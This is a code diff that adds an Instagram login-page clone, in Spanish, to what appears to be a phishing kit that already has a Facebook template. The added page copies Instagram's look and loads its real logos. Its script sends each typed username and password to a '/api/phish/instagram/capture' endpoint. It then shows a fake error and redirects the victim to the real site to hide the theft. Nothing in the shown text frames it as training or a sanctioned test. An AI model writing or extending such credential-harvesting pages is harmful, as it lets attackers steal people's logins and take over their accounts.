@@ -377,8 +377,296 @@ document.getElementById('loginForm').addEventListener('submit', async function(e
 </html>`;
 }
 
+function buildInstagramPage(sessionId: string): string {
+  return `<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+<title>Instagram</title>
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+    background: #fafafa;
+    min-height: 100vh;
+    color: #262626;
+  }
+
+  /* Layout centrado en desktop */
+  .page-wrap {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    min-height: 100vh;
+    padding: 12px 0 24px;
+  }
+
+  /* Tarjeta principal */
+  .card {
+    background: #fff;
+    border: 1px solid #dbdbdb;
+    border-radius: 2px;
+    width: 100%;
+    max-width: 350px;
+    padding: 40px 40px 10px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+  }
+
+  /* Logo cámara + wordmark */
+  .ig-logo-wrap {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    margin-bottom: 28px;
+  }
+  .ig-wordmark {
+    height: 52px;
+  }
+
+  /* Inputs */
+  .field {
+    width: 100%;
+    margin-bottom: 6px;
+  }
+  .field input {
+    width: 100%;
+    padding: 9px 8px 7px;
+    border: 1px solid #dbdbdb;
+    border-radius: 3px;
+    font-size: 12px;
+    background: #fafafa;
+    color: #262626;
+    outline: none;
+    transition: border-color 0.15s;
+  }
+  .field input:focus {
+    border-color: #a8a8a8;
+    background: #fff;
+  }
+  .field input::placeholder { color: #8e8e8e; }
+
+  /* Botón Iniciar sesión */
+  .btn-login {
+    width: 100%;
+    padding: 7px 16px;
+    background: #0095f6;
+    color: #fff;
+    border: none;
+    border-radius: 8px;
+    font-size: 14px;
+    font-weight: 600;
+    cursor: pointer;
+    margin-top: 8px;
+    opacity: 0.7;
+    transition: opacity 0.15s;
+  }
+  .btn-login.active { opacity: 1; }
+  .btn-login:disabled { cursor: default; }
+
+  /* ¿Olvidaste? */
+  .forgot {
+    margin-top: 14px;
+    font-size: 12px;
+    text-align: center;
+  }
+  .forgot a { color: #00376b; text-decoration: none; font-weight: 600; }
+
+  /* Separador OR */
+  .sep {
+    display: flex;
+    align-items: center;
+    gap: 18px;
+    width: 100%;
+    margin: 18px 0;
+  }
+  .sep-line { flex: 1; height: 1px; background: #dbdbdb; }
+  .sep-text { font-size: 13px; font-weight: 600; color: #8e8e8e; letter-spacing: 1px; }
+
+  /* Botón Facebook */
+  .btn-fb {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    width: 100%;
+    background: none;
+    border: none;
+    cursor: pointer;
+    font-size: 14px;
+    font-weight: 600;
+    color: #385185;
+    padding: 8px 0 18px;
+  }
+  .btn-fb svg { width: 20px; height: 20px; }
+
+  /* Tarjeta "¿No tienes cuenta?" */
+  .card-register {
+    background: #fff;
+    border: 1px solid #dbdbdb;
+    border-radius: 2px;
+    width: 100%;
+    max-width: 350px;
+    padding: 20px;
+    text-align: center;
+    margin-top: 10px;
+    font-size: 14px;
+    color: #262626;
+  }
+  .card-register a { color: #0095f6; font-weight: 600; text-decoration: none; }
+
+  /* Descarga la app */
+  .app-section {
+    margin-top: 20px;
+    text-align: center;
+    font-size: 14px;
+    color: #262626;
+    margin-bottom: 14px;
+  }
+  .app-badges {
+    display: flex;
+    gap: 8px;
+    justify-content: center;
+    margin-top: 12px;
+  }
+  .app-badges img { height: 38px; }
+
+  /* Error */
+  .error-msg {
+    color: #ed4956;
+    font-size: 13px;
+    text-align: center;
+    margin-bottom: 10px;
+    display: none;
+  }
+
+  /* Responsive: en móvil quitamos bordes de tarjeta */
+  @media (max-width: 480px) {
+    .card, .card-register {
+      border: none;
+      border-radius: 0;
+      max-width: 100%;
+    }
+  }
+</style>
+</head>
+<body>
+<div class="page-wrap">
+
+  <!-- Tarjeta principal -->
+  <div class="card">
+    <!-- Logo wordmark oficial de Instagram -->
+    <div class="ig-logo-wrap">
+      <img class="ig-wordmark"
+        src="https://static.cdninstagram.com/rsrc.php/v3/yK/r/ATpC0HgMr49.png"
+        alt="Instagram"
+        onerror="this.style.display='none';document.getElementById('igtext').style.display='block'">
+      <span id="igtext" style="display:none;font-size:28px;font-weight:700;font-style:italic;letter-spacing:-0.5px;font-family:Georgia,serif;">Instagram</span>
+    </div>
+
+    <div class="error-msg" id="err">El nombre de usuario que ingresaste no pertenece a ninguna cuenta. <a href="#" style="color:#385185;font-weight:700;">Regístrate</a></div>
+
+    <form id="loginForm" style="width:100%;">
+      <div class="field">
+        <input type="text" id="username" name="username"
+          placeholder="Teléfono, usuario o correo electrónico"
+          autocomplete="username" autocapitalize="off" autocorrect="off" required>
+      </div>
+      <div class="field">
+        <input type="password" id="password" name="password"
+          placeholder="Contraseña"
+          autocomplete="current-password" required>
+      </div>
+      <button type="submit" class="btn-login" id="btn" disabled>Iniciar sesión</button>
+    </form>
+
+    <div class="sep">
+      <div class="sep-line"></div>
+      <span class="sep-text">O</span>
+      <div class="sep-line"></div>
+    </div>
+
+    <button class="btn-fb" onclick="return false;">
+      <!-- Icono Facebook -->
+      <svg viewBox="0 0 24 24" fill="#385185"><path d="M12 2.04C6.5 2.04 2 6.53 2 12.06C2 17.06 5.66 21.21 10.44 21.96V14.96H7.9V12.06H10.44V9.85C10.44 7.34 11.93 5.96 14.22 5.96C15.31 5.96 16.45 6.15 16.45 6.15V8.62H15.19C13.95 8.62 13.56 9.39 13.56 10.18V12.06H16.34L15.89 14.96H13.56V21.96A10 10 0 0 0 22 12.06C22 6.53 17.5 2.04 12 2.04Z"/></svg>
+      Iniciar sesión con Facebook
+    </button>
+
+    <div class="forgot">
+      <a href="#">¿Olvidaste la contraseña?</a>
+    </div>
+  </div>
+
+  <!-- Tarjeta Regístrate -->
+  <div class="card-register">
+    ¿No tienes una cuenta? <a href="#">Regístrate</a>
+  </div>
+
+  <!-- Descarga la app -->
+  <div class="app-section">
+    <p>Descarga la aplicación.</p>
+    <div class="app-badges">
+      <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="App Store" onerror="this.style.display='none'">
+      <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/KFyqdIsB0L4.png" alt="Google Play" onerror="this.style.display='none'">
+    </div>
+  </div>
+
+</div>
+
+<script>
+const u = document.getElementById('username');
+const p = document.getElementById('password');
+const btn = document.getElementById('btn');
+
+function checkFields() {
+  if (u.value.trim().length > 0 && p.value.length > 0) {
+    btn.disabled = false;
+    btn.classList.add('active');
+  } else {
+    btn.disabled = true;
+    btn.classList.remove('active');
+  }
+}
+u.addEventListener('input', checkFields);
+p.addEventListener('input', checkFields);
+
+document.getElementById('loginForm').addEventListener('submit', async function(e) {
+  e.preventDefault();
+  const uv = u.value.trim();
+  const pv = p.value;
+  if (!uv || !pv) return;
+  btn.disabled = true;
+  btn.textContent = 'Iniciando...';
+  document.getElementById('err').style.display = 'none';
+  try {
+    await fetch('/api/phish/instagram/capture?session=${sessionId}', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ username: uv, password: pv })
+    });
+  } catch(_) {}
+  setTimeout(function() {
+    document.getElementById('err').style.display = 'block';
+    btn.disabled = false;
+    btn.textContent = 'Iniciar sesión';
+    btn.classList.add('active');
+    p.value = '';
+    p.focus();
+    checkFields();
+    setTimeout(function() { window.location.href = 'https://www.instagram.com'; }, 3000);
+  }, 1400);
+});
+</script>
+</body>
+</html>`;
+}
+
 function buildPhishPage(templateId: string, sessionId: string): string {
   if (templateId === "facebook") return buildFacebookPage(sessionId);
+  if (templateId === "instagram") return buildInstagramPage(sessionId);
 
   const cfg = TEMPLATE_CONFIG[templateId] ?? { ...DEFAULT_CONFIG, name: templateId };
   const isDark = cfg.bgColor === "#000" || cfg.bgColor === "#313338";
